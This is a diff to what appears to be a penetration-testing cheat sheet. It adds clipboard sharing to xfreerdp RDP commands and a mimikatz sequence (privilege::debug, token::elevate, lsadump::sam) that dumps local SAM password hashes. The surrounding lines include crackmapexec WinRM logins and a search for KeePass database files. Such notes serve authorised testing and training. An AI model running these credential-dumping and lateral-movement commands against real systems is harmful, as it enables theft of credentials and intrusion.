@@ -123,15 +123,15 @@ crackmapexec winrm $TARGET_IP -u $USER -p $PASSWORD
 ```
 
 
-Port 3389 RDP:
+Port 3389 RDP with clipboard enabled:
 
 ```bash
-xfreerdp /v:$TARGET_IP /u:$USER
+xfreerdp +clipboard /v:$TARGET_IP /u:$USER
 ```
 
 Connect with shared folder, and NLA :
 ```bash
-xfreerdp /v:$TARGET_IP /sec:nla /u:$USER /p:$PASSWORD /drive:shared,/home/kali/shared
+xfreerdp +clipboard /v:$TARGET_IP /sec:nla /u:$USER /p:$PASSWORD /drive:shared,/home/kali/shared
 ```
 
 Brute force RDP:
@@ -144,4 +144,13 @@ Check FS for keepass files:
 
 ```powershell
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+```
+
+
+mimikatz dump as local admin:
+#dump #mimikatz
+```powershell
+privilege::debug
+token::elevate
+lsadump::sam
 ```
